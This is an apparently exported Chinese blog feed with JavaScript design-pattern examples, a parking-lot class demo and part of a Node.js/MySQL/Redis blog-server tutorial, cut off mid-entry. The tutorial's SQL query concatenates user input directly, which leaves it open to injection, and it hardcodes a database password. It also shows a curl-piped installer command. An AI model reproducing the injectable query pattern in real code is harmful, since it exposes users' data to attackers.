3 层，每层 100 车位每个车位都能监控到车辆的驶入和离开车辆进入前，显示每层的空余车位数量车辆进入时，摄像头可识别车牌号和时间车辆出来时，出口显示器显示车牌号和停车时长 UML 类图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120// /review2.jsclass Park &#123; constructor(floors) &#123; this.floors = floors || [] this.camera = new Camera() this.screen = new Screen() this.carList = &#123;&#125; &#125; in(car) &#123; // 通过摄像头获取信息 let info = this.camera.shot(car) // 停到某个停车位 let i = parseInt(Math.random() * 100 % 100) let place = this.floors[0].places[i] place.in() info.place = place // 记录信息 this.carList[car.number] = info &#125; out(car) &#123; // 获取信息 let info = this.carList[car.number] // 将停车位清空 let place = info.place place.out() // 显示时间 this.screen.show(car, info.inTime) // 清空记录 delete this.carList[car.number] &#125; emptyNum() &#123; return this.floors.map(floor =&gt; &#123; return `$&#123;floor.index&#125; 层, 还有 $&#123;floor.emptyPlaceNum()&#125; 个空余车位` &#125;).join('\n') &#125;&#125;class Car &#123; constructor(number) &#123; this.number = number &#125;&#125;class Floor &#123; constructor(index, places) &#123; this.index = index this.places = places || [] &#125; emptyPlaceNum() &#123; let num = 0 this.places.forEach(p =&gt; &#123; if(p.empty) &#123; num++ &#125; &#125;) return num &#125;&#125;class Place &#123; constructor(empty) &#123; this.empty = true &#125; in() &#123; this.empty = false &#125; out() &#123; this.empty = true &#125;&#125;class Camera &#123; shot(car) &#123; return &#123; number: car.number, inTime: Date.now() &#125; &#125;&#125;class Screen &#123; show(car, inTime) &#123; console.log(`车牌号 $&#123;car.number&#125;, 停车时间 $&#123;Date.now() - inTime&#125;`) &#125;&#125;// 测试// 初始化停车场let floors = []for(let i=0;i&lt;3;i++) &#123; let places = [] for(let j=0;j&lt;100;j++) &#123; places[j] = new Place() &#125; floors[i] = new Floor(i+1, places)&#125;let park = new Park(floors)// 初始化车辆let car1 = new Car(100)let car2 = new Car(200)let car3 = new Car(300)console.log('第一辆车进入')console.log(park.emptyNum())park.in(car1)console.log('第二辆车进入')console.log(park.emptyNum())park.in(car2)console.log('第一辆车离开')park.out(car1)console.log('第二辆车离开')park.out(car2)console.log('第三辆车进入')console.log(park.emptyNum())park.in(car3)console.log('第三辆车离开')park.out(car3)]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式]]></title>
    <url>%2F2019%2F06%2F15%2FJS%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B8%80%2F</url>
    <content type="text"><![CDATA[设计模式 Design pattern, 开发过程中面临的一般问题的解决方案, 代表了最佳的实践 单例模式 singleton pattern保证一个类仅有一个实例，并提供访问此实例的全局访问点 用途:如果一个类负责连接数据库的线程池、日志记录逻辑等等，此时需要单例模式来保证对象不被重复创建，以达到降低开销的目的。123456789101112131415161718const Singleton = function() &#123;&#125;;Singleton.getInstance = (function() &#123; // 由于es6没有静态类型,故闭包: 函数外部无法访问 instance let instance = null; return function() &#123; // 检查是否存在实例 if (!instance) &#123; instance = new Singleton(); &#125; return instance; &#125;;&#125;)();let s1 = Singleton.getInstance();let s2 = Singleton.getInstance();console.log(s1 === s2); 策略模式 strategy pattern把一系列“可互换的”算法封装起来，并根据用户需求来选择其中一种。根据不同参数可以命中不同的策略将算法的使用和算法的实现分离。算法的实现交给策略类。算法的使用交给环境类，环境类会根据不同的情况选择合适的算法。策略类1234567891011121314151617const strategies = &#123; A() &#123; console.log("This is stragegy A"); &#125;, B() &#123; console.log("This is stragegy B"); &#125;&#125;;// 环境类const context = name =&gt; &#123; return strategies[name]();&#125;;// 调用策略Acontext("A");// 调用策略Bcontext("B"); 代理模式为一个对象提供一种代理以方便对它的访问，代理对象和本体对象具有一致的接口 可以解决避免对一些对象的直接访问，常见的有保护代理和虚拟代理。保护代理可以在代理中直接拒绝对对象的访问；虚拟代理可以延迟访问到真正需要的时候，以节省程序开销。 代理模式有高度解耦、对象保护、易修改等优点。缺点是开销会更大，时间也会更慢。12345678910111213141516171819202122232425const myImg = &#123; setSrc(imgNode, src) &#123; imgNode.src = src; &#125;&#125;;// 利用代理模式实现图片懒加载const proxyImg = &#123; setSrc(imgNode, src) &#123; myImg.setSrc(imgNode, "./image.png"); // NO1. 加载占位图片并且将图片放入&lt;img&gt;元素 let img = new Image(); img.onload = () =&gt; &#123; myImg.setSrc(imgNode, src); // NO3. 完成加载后, 更新 &lt;img&gt; 元素中的图片 &#125;; img.src = src; // NO2. 加载真正需要的图片 &#125;&#125;;let imgNode = document.createElement("img"), imgSrc = "https://avatars1.githubusercontent.com/u/33623220?s=400&amp;u=a533c464d2c67f847107ddb146da56d5b8b69ea5&amp;v=4"document.body.appendChild(imgNode);proxyImg.setSrc(imgNode, imgSrc); 迭代器模式提供一种方法顺序访问一个集合对象的各个元素，使用者不需要了解集合对象的底层实现 内部迭代器：封装的方法完全接手迭代过程，外部只需要一次调用。 外部迭代器：用户必须显式地请求迭代下一元素。可以类比C++内置对象的迭代器的 end()、next()等方法123456789101112131415161718const Iterator = obj =&gt; &#123; let current = 0; let next = () =&gt; current += 1; let end = () =&gt; current &gt;= obj.length; let get = () =&gt; obj[current]; return &#123; next, end, get &#125;&#125;let myIter = Iterator([1, 2, 3]);while(!myIter.end()) &#123; console.log(myIter.get()) myIter.next();&#125; 观察者模式:当观察对象发生变化时自动调用相关函数vue 双向绑定 订阅-发布模式: 定义了对象之间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖它的对象都可以得到通知优点: “时间解耦”和“空间解耦”订阅-发布模式” vs 观察者模式 发布+订阅=观察者模式。其核心思想是状态改变和发布通知。两者概念相似，但在订阅-发布模式中，订阅者和发布者之间多了一层中间件：一个被抽象出来的信息调度中心。 JS中一般用事件模型来代替传统的发布-订阅模式。任何一个对象的原型链被指向Event的时候，这个对象便可以绑定自定义事件和对应的回调函数。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374const Event = &#123; clientList: &#123;&#125;, // 绑定事件监听 listen(key, fn)&#123; if(! this.clientList[key])&#123; this.clientList[key] = []; &#125; this.clientList[key].push(fn); return true; &#125;, // 触发对应事件 trigger()&#123; const key = Array.prototype.shift.apply(arguments), fns = this.clientList[key]; if(!fns || fns.length === 0)&#123; return false; &#125; for(let fn of fns)&#123; fn.apply(null, arguments); &#125; return true; &#125;, // 移除相关事件 remove(key, fn)&#123; let fns = this.clientList[key]; // 如果之前没有绑定事件或者没有指明要移除的事件 直接返回 if(!fns || !fn)&#123; return false; &#125; // 反向遍历移除置指定事件函数 for(let l = fns.length - 1; l &gt;= 0; l--)&#123; let _fn = fns[l]; if(_fn === fn)&#123; fns.splice(l, 1); &#125; &#125; return true; &#125;&#125;// 为对象动态安装 发布-订阅 功能const installEvent = (obj) =&gt; &#123; for(let key in Event)&#123; obj[key] = Event[key]; &#125;&#125;let salesOffices = &#123;&#125;;installEvent(salesOffices);// 绑定自定义事件和回调函数salesOffices.listen("event01", fn1 = (price) =&gt; &#123; console.log("Price is", price, "at event01");&#125;)salesOffices.listen("event02", fn2 = (price) =&gt; &#123; console.log("Price is", price, "at event02");&#125;)salesOffices.trigger("event01", 1000);salesOffices.trigger("event02", 2000);salesOffices.remove("event01", fn1);// 输出: false 说明删除成功console.log(salesOffices.trigger("event01", 1000)); 命令模式一种数据驱动的设计模式，它属于行为型模式步骤：1、请求以命令的形式包裹在对象中，并传给调用对象。2、调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象。3、该对象执行命令。 在这三步骤中，分别有3个不同的主体：发送者、传递者和执行者。在实现过程中，需要特别关注。 应用场景：有时候需要向某些对象发送请求，但是又不知道请求的接受者是谁，更不知道被请求的操作是什么。此时，命令模式就是以一种松耦合的方式来设计程序。 1234567891011121314151617181920212223242526// 接受到命令，执行相关操作const MenuBar = &#123; refresh()&#123; console.log("刷新菜单页面"); &#125;&#125;;// 命令对象，execute方法就是执行相关命令const RefreshMenuBarCommand = receiver =&gt; &#123; return &#123; execute()&#123; receiver.refresh(); &#125; &#125;&#125;;// 为按钮对象指定对应的 对象 const setCommand = (button, command) =&gt; &#123; button.onclick = () =&gt; &#123; command.execute(); &#125;&#125;;let refreshMenuBarCommand = RefreshMenuBarCommand(MenuBar);let button = document.querySelector("button");setCommand(button, refreshMenuBarCommand); 组合模式将对象组合成树形结构以表示“部分-整体”的层次结构。用小的子对象构造更大的父对象，而这些子对象也由更小的子对象构成； 单个对象和组合对象对于用户暴露的接口具有一致性，而同种接口不同表现形式亦体现了多态性应用场景： 在需要针对“树形结构”进行操作的应用中使用，例如扫描文件夹、渲染网站导航结构等等。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// 文件类class File &#123; constructor(name) &#123; this.name = name || "File"; &#125; add() &#123; throw new Error("文件夹下面不能添加文件"); &#125; scan() &#123; console.log("扫描文件: " + this.name); &#125;&#125;// 文件夹类class Folder &#123; constructor(name) &#123; this.name = name || "Folder"; this.files = []; &#125; add(file) &#123; this.files.push(file); &#125; scan() &#123; console.log("扫描文件夹: " + this.name); for (let file of this.files) &#123; file.scan(); &#125; &#125;&#125;let home = new Folder("用户根目录");let folder1 = new Folder("第一个文件夹"), folder2 = new Folder("第二个文件夹");let file1 = new File("1号文件"), file2 = new File("2号文件"), file3 = new File("3号文件");// 将文件添加到对应文件夹中folder1.add(file1);folder2.add(file2);folder2.add(file3);// 将文件夹添加到更高级的目录文件夹中home.add(folder1);home.add(folder2);// 扫描目录文件夹home.scan();// 最终输出结果是：// 扫描文件夹: 用户根目录// 扫描文件夹: 第一个文件夹// 扫描文件: 1号文件// 扫描文件夹: 第二个文件夹// 扫描文件: 2号文件// 扫描文件: 3号文件 享元模式运用共享技术来减少创建对象的数量，从而减少内存占用、提高性能。 将一个对象的属性划分为内部状态(可以被对象集合共享，通常不会改变) 和 外部状态(根据应用场景经常改变)。享元模式是利用时间换取空间的优化模式。 只要是需要大量创建重复的类的代码块，均可以使用享元模式抽离内部/外部状态，减少重复类的创建。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// 对象池class ObjectPool &#123; constructor() &#123; this._pool = []; &#125; // 创建对象 create(Obj) &#123; return this._pool.length === 0 ? new Obj(this) // 对象池中没有空闲对象，则创建一个新的对象 : this._pool.shift(); // 对象池中有空闲对象，直接取出，无需再次创建 &#125; // 对象回收 recover(obj) &#123; return this._pool.push(obj); &#125; // 对象池大小 size() &#123; return this._pool.length; &#125;&#125;// 模拟文件对象class File &#123; constructor(pool) &#123; this.pool = pool; &#125; // 模拟下载操作 download() &#123; console.log(`+ 从 $&#123;this.src&#125; 开始下载 $&#123;this.name&#125;`); setTimeout(() =&gt; &#123; console.log(`- $&#123;this.name&#125; 下载完毕`); // 下载完毕后, 将对象重新放入对象池 this.pool.recover(this); &#125;, 100); &#125;&#125;// 以下是测试函数let objPool = new ObjectPool();let file1 = objPool.create(File);file1.name = "文件1";file1.src = "https://download1.com";file1.download();let file2 = objPool.create(File);file2.name = "文件2";file2.src = "https://download2.com";file2.download();setTimeout(() =&gt; &#123; let file3 = objPool.create(File); file3.name = "文件3"; file3.src = "https://download3.com"; file3.download();&#125;, 200);setTimeout( () =&gt; console.log( `$&#123;"*".repeat(50)&#125;\n下载了3个文件，但其实只创建了$&#123;objPool.size()&#125;个对象` ), 1000);// 输出结果如下：// + 从 https://download1.com 开始下载 文件1// + 从 https://download2.com 开始下载 文件2// - 文件1 下载完毕// - 文件2 下载完毕// + 从 https://download3.com 开始下载 文件3// - 文件3 下载完毕// **************************************************// 下载了3个文件，但其实只创建了2个对象]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js从零开发Web Server博客项目]]></title>
    <url>%2F2019%2F05%2F25%2FNode%2FNodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%8F%91Web-Server%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[create by sea, 2019.5.7 Node.js从零开发Web Server博客项目nodejs 介绍下载和安装 普通方式访问官网 https://nodejs.org/en/ ，下载并安装, 命令行运行node -v 查看当前node版本 显示结果则安装成功 nvm node版本管理工具 (macOS)安装HomeBrew/usr/bin/ruby -e “$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;安装nvmbrew install nvm查看当前所有node版本nvm listnvm install node 安装最新版本nvm install v10.15.3 安装指定版本nvm use v10.13.0 切换到指定版本nvm use –delete-prefix v10.15.3 切换到指定版本 nodejs和js的区别ECMAScipt， 语法规范，定义了语法和词法javascript， 使用了ECMAScipt语法规范，以及Web API(w3c标准)nodejs， 使用了ECMAScipt语法规范，以及nodejs API CommonJs 模块化12345678910111213141516171819202122// a.jsfunction add(a, b) &#123; return a + b&#125;function mul(a, b) &#123; return a * b&#125;module.exports = &#123; add, mul&#125;// b.jsconst &#123;add, mul&#125; = require('./a')const sum = add(2, 3)const res = mul(2, 3)console.log(sum, res) debuggernpm init -y 初始化package.json需指定package.json 对应 “main”: “index.js” server端和前端的区别, 切换思路服务稳定性，使用PM2做进程守候考虑内存和CPU (优化、扩展)， server端要承载很多请求，内存和CPU 都是稀缺资源。stream 写日志，使用redis 存session日志记录, 记录、存储、分析日志，否则是盲人摸象安全，如越权操作、数据库攻击、xss攻击集群和服务拆分 项目需求分析 和 技术方案目标: 开发一个博客系统，具有博客的基本功能需求：首页、作者主页、博客详情页；登录页；管理中心、新建页、编辑页 技术方案:数据如何存储(博客、用户)，数据库表设计接口设计，如何与前端对接登录，业界有统一的解决方案，一般不用再重新设计 开发博客项目之接口http 概述浏览器发送http请求过程: DNS解析(浏览器自身的DNS缓存且未过期、操作系统自身的DNS缓存且未过期、hosts文件、首选DNS服务器 运营商DNS、根域名服务器、顶级域名服务器 、域名注册商服务器) –&gt; 发起TCP的3次握手 –&gt; 建立TCP连接后发起http请求(报文格式为请求行、请求头部、请求包体) –&gt; 服务器响应http请求，浏览器得到html代码 –&gt; 浏览器解析html代码，并请求html代码中的资源 –&gt; 浏览器对页面进行渲染呈现给用户 处理http请求123456789101112131415161718192021222324252627282930313233343536const http = require('http')const querystring = require('querystring')const server = http.createServer((req, res) =&gt; &#123; const url = req.url // get请求与querystring if(req.method==='GET') &#123; const path = url.split('?')[0] console.log(path) // 返回路由 req.query = querystring.parse(url.split('?')[1]) // 设置返回格式为JSON res.writeHead(200, &#123;'Content-Type': 'application/json'&#125;) res.end(JSON.stringify(req.query)) &#125; // post请求与post data if(req.method==='POST') &#123; let postData = '' req.on('data', chunk =&gt; &#123; postData += chunk.toString() &#125;) req.on('end', () =&gt; &#123; console.log(postData) res.end('hello node') &#125;) &#125;&#125;)server.listen(3000, () =&gt; &#123; console.log('listening at http://localhost:3000')&#125;) 搭建开发环境使用nodemon检测文件变化，自动重启node使用cross-env 设置环境变量，兼容mac linux 和windows, 需先使用 npm i –save-dev cross-env 命令安装cross-env 开发接口，处理路由初始化路由: 根据技术方案的设计，做出路由返回假数据: 将路由和数据分离，以符合设计原则，使用 postman 处理http请求结构层次: 划分为三层: www启动服务及基本配置、index分配路由、router处理路由、 controller接口调用获取结果、model格式化返回结果 启动服务，基本配置12345678910// /.bin/www.jsconst http = require('http')const PORT = 3000const serverHandle = require('../index')const server = http.createServer(serverHandle)server.listen(PORT, () =&gt; &#123; console.log('listening at http://localhost:3000')&#125;) 分配路由12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273// /index.js const quertstring = require('querystring')const handleUserRouter = require('./src/router/user')const handleBlogRouter = require('./src/router/blog')// 处理 post body dataconst getPostBodyData = (req) =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; if(req.method !== 'POST') &#123; resolve(&#123;&#125;) &#125; if(!req.headers['content-type'].includes('application/json')) &#123; // 实际上req.headers['content-type'] 为 'application/json;charset=UTF-8' resolve(&#123;&#125;) &#125; let postData = '' req.on('data', chunk =&gt; &#123; postData += chunk.toString() &#125;) req.on('end', () =&gt; &#123; if(!postData) &#123; resolve(&#123;&#125;) &#125; resolve(JSON.parse(postData)) &#125;) &#125;)&#125;const serverHandler = (req, res) =&gt; &#123; // 设置返回数据格式 JSON res.setHeader('Content-Type', 'application/json') // 获取path 路由 const url = req.url req.path = url.split('?')[0] // 解析query req.query = quertstring.parse(url.split('?')[1]) // 处理 post body data getPostBodyData(req).then(postData =&gt; &#123; req.body = postData // 处理blog路由 const blogData = handleBlogRouter(req, res) if(blogData) &#123; res.end( JSON.stringify(blogData) ) return &#125; // 处理user路由 const userData = handleUserRouter(req, res) if(userData) &#123; res.end( JSON.stringify(userData) ) return &#125; // 未命中 404 res.writeHead(404, &#123;'Content-Type': 'text/plain'&#125;) res.write('404 Not Found') res.end() &#125;)&#125;module.exports = serverHandler 处理路由，router/blog.js 和 router/user.js 分别处理blog和user相关路由12345678910111213// 如 router/user.js const handleUserRouter = (req, res) =&gt; &#123; const &#123; method, url, path &#125; = req // 登录 if(method==='POST' &amp;&amp; path==='/api/user/login') &#123; return &#123; msg: '登录' &#125; &#125;&#125;module.exports = handleUserRouter 格式化返回结果123456789101112131415161718192021222324252627282930313233343536373839// model/resModelclass BaseModel &#123; constructor(data, message) &#123; // data是对象，message是字符串，并兼容不传data的情况 if(typeof data === 'string') &#123; this.message = data data = null message = null &#125; if(data) &#123; this.data = data &#125; if(message) &#123; this.message = message &#125; &#125;&#125;class SuccessModel extends BaseModel &#123; constructor(data, message) &#123; super(data, message) this.errno = 0 &#125;&#125;class ErrorModel extends BaseModel &#123; constructor(data, message) &#123; super(data, message) this.errno = -1 &#125;&#125;module.exports = &#123; SuccessModel, ErrorModel&#125; MySql 数据存储安装MySql 是web server中最流行的关系型数据库官网下载安装MySql、mysql workbench 操作sql 的可视化客户端，或者使用Navicat 操作数据库 建库create schema ‘myblog’; 创建myblog 的数据库show databases; 查询是否成功 建表新建 users 和 blogs两个表 1234567891011// column datatype pk主键 nn不为空 AI自动增加 Default users: id username password realnameCREATE TABLE `myblg`, `users` ( `id` INT NOT NULL AUTO_INCREMENT, `username` VARCHAR(20) NOT NULL, `password` VARCHAR(20) NOT NULL, `realname` VARCHAR(10) NOT NULL, PRIMARY KEY(`id`));blogs: id title content createtime author 表操作删改查 12345678910111213141516171819202122use webserver;-- show databases;// 修改列属性 让id 自增, 或者选中fileds点击某列修改属性alter table users change `id` `id` INT(10) NOT NULL AUTO_INCREMENT// 增insert into users (username, `password`, realname) values('zhangsan', '123', '张三');// 查select * from users; // 所有列select id, username from users // 指定列名select id, username from users where id='123' and username='zhangsan'; // 指定列名和条件select id, username from users where username like '%zhang%'; // 模糊查询select id, username from users where username like '%zhang%' order by id desc; // 排序 倒叙// 改update users set realname='张三', state=0 where username='lisi' limit 5// 删delete from users where username='lisi';update users set state=0 where username='lisi' // 实际项目中 更多修改表，新增state字段，通过修改状态标记是否可用，来软删除 nodejs操作数据库npm i mysql –savenpm run dev 启动项目,这步需要安装cross-env, 使用命令npm i –save-dev cross-env demo12345678910111213141516171819202122232425262728// myql-test/index.js democonst mysql = require('mysql')// 创建连接对象const con = mysql.createConnection(&#123; host: 'localhost', user: 'root', password: 'sea123456', port: 3306, database: 'webserver'&#125;)// 开始连接con.connect()// 执行 sql 语句const sql = `insert into users (username, realname, password, state) values('zl','赵六','123','1')`con.query(sql, (err, result) =&gt; &#123; if(err) &#123; console.log(err) return &#125; console.log(result) &#125;)// 关闭连接con.end() nodejs 连接 mysql 做成工具在config/db.js 配置mysql, db/mysql.js 导出统一执行sql语句的函数 execSql。 这样就将mysql集成进项目，不再是上面的demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// config/db.jsconst env = process.env.NODE_ENV// 配置let MYSQL_CONF = &#123;&#125;if(env==='dev') &#123; MYSQL_CONF = &#123; host: 'localhost', user: 'root', password: 'sea123456', port: 3306, database: 'webserver' &#125;&#125;if(env==='production') &#123; MYSQL_CONF = &#123;//..&#125;&#125;module.exports = &#123; MYSQL_CONF&#125;// db/mysql.jsconst mysql = require('mysql')const &#123; MYSQL_CONF &#125; = require('../config/db')// 创建连接对象const con = mysql.createConnection(MYSQL_CONF)// 开始连接con.connect()// 统一执行 sql 语句的函数function execSql(sql) &#123; return new Promise((resolve, reject) =&gt; &#123; con.query(sql, (err, result) =&gt; &#123; if(err) &#123; reject(err) &#125; resolve(result) &#125;) &#125;)&#125;// 关闭连接 不需要关闭，单例模式// con.end()module.exports = &#123; execSql&#125; API对接mysql（博客列表）替换假数据，controller改为mysql连接的真实数据, 并修改路由router 和 index.js 为异步promise。 以blog 的 getList 获取博客列表 为例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// controller/blog.jsconst getList = (author, keyword) =&gt; &#123; let sql = `select * from blogs where 1=1 ` if(author) &#123; sql += `and author='$&#123;author&#125;' ` &#125; if(keyword) &#123; sql += `and title like '%$&#123;keyword&#125;%' ` &#125; sql += `order by createtime desc;` let result = execSql(sql) return result&#125;// router/blog.js// 获取博客列表if(method==='GET' &amp;&amp; path==='/api/blog/list') &#123; const author = req.query.author || '' const keyword = req.query.keyword || '' // const listData = getList(author, keyword) // return new SuccessModel(listData) const result = getList(author, keyword) return result.then(listData =&gt; &#123; return new SuccessModel(listData) &#125;)&#125;// index.jsgetPostBodyData(req).then(postData =&gt; &#123; req.body = postData // 处理blog路由 // const blogData = handleBlogRouter(req, res) // if(blogData) &#123; // res.end( // JSON.stringify(blogData) // ) // return // &#125; const blogResult = handleBlogRouter(req, res) if(blogResult) &#123; blogResult.then(blogData =&gt; &#123; res.end( JSON.stringify(blogData) ) &#125;) return // return 要写在这 &#125; // ..&#125; 登录校验、登录信息存储cookieHTTP Cookie是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。 主要用于: 会话状态管理（如用户登录状态、购物车）、个性化设置（如用户自定义设置、主题等）、浏览器行为跟踪（如跟踪分析用户行为等） 特点: 最大5kb、跨域不共享、格式如 k1=v1;k2=v2; 因此可以存储结构化数据 客户端操作cookie: document.cooke=’k3=v3’ 会累加到cookie中server端操作cookie:1234567891011121314151617181920212223242526272829// index.js 解析cookie, 处理成键值对 存入req.cookie中req.cookie = &#123;&#125;const cookieStr = req.headers.cookie || ''cookieStr.split(';').forEach(item =&gt; &#123; if(!item) return const arr = item.split('=') const key = arr[0].trim() // trim() 保证去除收尾空格 const val = arr[1].trim() req.cookie[key] = val&#125;)// router/user.jsconst handleUserRouter = (req, res) =&gt; &#123; const &#123; method, url, path &#125; = req // 登录 if(method==='POST' &amp;&amp; path==='/api/user/login') &#123; const &#123; username, password &#125; = req.body const result = loginCheck(username, password) return result.then(userData =&gt; &#123; if(userData.username) &#123; // 操作cookie 使用 HttpOnly 和 expires 限制前端获取改写和设置cookie及过期时间 res.setHeader('Set-Cookie', `username=$&#123;userData.username&#125;; path=/; HttpOnly; expires=$&#123;setCookieExpire()&#125;`) return new SuccessModel(userData) &#125; return new ErrorModel('登录失败') &#125;) &#125;&#125; sessioncookie存储userid, server端的session存储用户信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// index.js// session 数据const SESSION_DATA = &#123;&#125;// 解析 sessionlet needSetCookie = falselet userId = req.cookie.useridif(userId) &#123; if(!SESSION_DATA[userId]) &#123; SESSION_DATA[userId] = &#123;&#125; &#125;&#125; else &#123; needSetCookie = true userId = `$&#123;Date.now()&#125;_$&#123;Math.random()&#125;` SESSION_DATA[userId] = &#123;&#125;&#125;req.session = SESSION_DATA[userId]// 处理 post body datagetPostBodyData(req).then(postData =&gt; &#123; req.body = postData // 处理blog路由 const blogResult = handleBlogRouter(req, res) if(blogResult) &#123; blogResult.then(blogData =&gt; &#123; // needSetCookie if(needSetCookie) &#123; res.setHeader('Set-Cookie', `userid=$&#123;userId&#125;; path=/; HttpOnly; expires=$&#123;setCookieExpire()&#125;`) &#125; res.end( JSON.stringify(blogData) ) &#125;) return &#125; // ...&#125;// router/user.jsconst handleUserRouter = (req, res) =&gt; &#123; const &#123; method, url, path &#125; = req // 登录 if(method==='POST' &amp;&amp; path==='/api/user/login') &#123; const &#123; username, password &#125; = req.body const result = loginCheck(username, password) return result.then(userData =&gt; &#123; if(userData.username) &#123; // 设置session req.session.username = userData.username // 操作cookie // res.setHeader('Set-Cookie', `username=$&#123;userData.username&#125;; path=/; HttpOnly; expires=$&#123;setCookieExpire()&#125;`) return new SuccessModel(userData) &#125; return new ErrorModel('登录失败') &#125;) &#125; // ...&#125; session 写入redisredisRemote Dictionary Server是一个由Salvatore Sanfilippo写的key-value存储系统。Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 为何将session 写入redis问题：目前session是js变量，放在nodejs进程内存中。进程内存有限，访问量过大，可能内存暴增；正式线上运行是多进程，进程间无法共享。方案：将web server和redis 拆分为两个单独的服务，双方都是独立可扩展的。解释：redis是web server最常用的缓存数据库，数据存放在内存中，相比硬盘中的mysql，访问速度快快几个量级。但成本更高，可存储数据量更小，断电即消失。原因: session访问频繁，对性能要求极高。session可忽略断电丢失数据的问题，重新获取即可。session相比mysql数据量不会太大。 redis 安装使用安装：brew install redis启动：redis-server、redis-cli (6379是redis 服务端口)设置：set myname sea (在redis-cli中，下同)获取： get myname获取所有：keys *删除： del myname nodejs连接redisredis-server 启动redisnpm i redis 安装redis依赖 123456789101112131415161718192021// redis-test democonst redis = require('redis')// 创建客户端const redisClient = redis.createClient(6379, '127.0.0.1')redisClient.on('error', err =&gt; &#123; console.error(err)&#125;)redisClient.set('myname', 'sea', redis.print)redisClient.get('myname', (err, val) =&gt; &#123; if(err) &#123; console.error(err) return &#125; console.log('val', val) // 退出 redisClient.quit()&#125;) nodejs连接redis 封装工具函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// config/db.js 配置redis常量let REDIS_CONF = &#123;&#125;if(env==='dev') &#123; // redis REDIS_CONF = &#123; host: '127.0.0.1', port: '6379', &#125; // ...&#125;// db/redis.js 封装成工具函数const redis = require('redis')const &#123; REDIS_CONF &#125; = require('../config/db')// 创建redis客户端const redisClient = redis.createClient(REDIS_CONF.port, REDIS_CONF.host)// 监听errorredisClient.on('error', err =&gt; &#123; console.error(err)&#125;)// 设置function setRedisVal(key, val) &#123; if(typeof val === 'object') &#123; val = JSON.stringify(val) &#125; redisClient.set(key, val, redis.print)&#125;// 获取function getRedisVal(key) &#123; return new Promise((resolve, reject) =&gt; &#123; redisClient.get(key, (err, val) =&gt; &#123; if(err) &#123; reject(err) return &#125; if(val===null) &#123; resolve(null) return &#125; try &#123; // 优先返回JSON 格式 resolve(JSON.parse(val)) &#125; catch(e) &#123; resolve(val) &#125; // redisClient.quit() &#125;) &#125;)&#125;module.exports = &#123; setRedisVal, getRedisVal,&#125; session登录验证 redis123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120// index.jsconst &#123; setCookieVal &#125; = require('./src/utils')const &#123; setRedisVal, getRedisVal &#125; = require('./src/db/redis')const serverHandler = (req, res) =&gt; &#123; // 设置返回数据格式 JSON res.setHeader('Content-Type', 'application/json') // 获取path 路由 const url = req.url req.path = url.split('?')[0] // 解析query req.query = quertstring.parse(url.split('?')[1]) // 解析cookie 处理成键值对 存入req.cookie中 const cookie = parseCookie(req) req.cookie = cookie // 解析 session let needSetCookie = false let userId = req.cookie.userid if(!userId) &#123; needSetCookie = true userId = `$&#123;Date.now()&#125;_$&#123;Math.random()&#125;` &#125; // 将 sessionId 设置为 userId，后面的登录路由处理会用到 req.sessionId = userId // 通过 userId 获取存储在 redis 中的数据 getRedisVal(req.sessionId) .then(sessionData =&gt; &#123; if(sessionData===null) &#123; // 当对应的 sessionId 在 redis 中没有值的时，在 redis 中将其值设置为空对象 setRedisVal(req.sessionId, &#123;&#125;) req.session = &#123;&#125; &#125; else &#123; req.session = sessionData &#125; return getPostBodyData(req) &#125;) .then(postData =&gt; &#123; req.body = postData // 处理blog路由 const blogResult = handleBlogRouter(req, res) if(blogResult) &#123; blogResult.then(blogData =&gt; &#123; if(needSetCookie) &#123; setCookieVal(res, 'userid', userId) &#125; res.end( JSON.stringify(blogData) ) &#125;) return &#125; // ... &#125;)&#125;// utils/index.js 统一的登录验证函数const loginCheckSession = (req) =&gt; &#123; // session中没有username信息，则返回错误信息 if(!req.session.username) &#123; return Promise.resolve(new ErrorModel('未登录')) &#125; // return undefined // 这行可注释掉，即没有返回值，或返回undefined&#125;// router/blog.jsconst &#123; loginCheckSession &#125; = require('../utils')const handleBlogRouter = (req, res) =&gt; &#123; const &#123; method, url, path &#125; = req // 登录验证 放在handleBlogRouter的顶部做成拦截器，保证所有后期请求都需先登录 const loginCheckResult = loginCheckSession(req) if(loginCheckResult) &#123; // 有值，说明未登录 return loginCheckResult &#125; // 新建一篇博客 比如新建博客时，需要校验author，从session的username取出，保证登录的账号和author是同一个人，不会删除其他人的博客 if(method==='POST' &amp;&amp; path==='/api/blog/new') &#123; 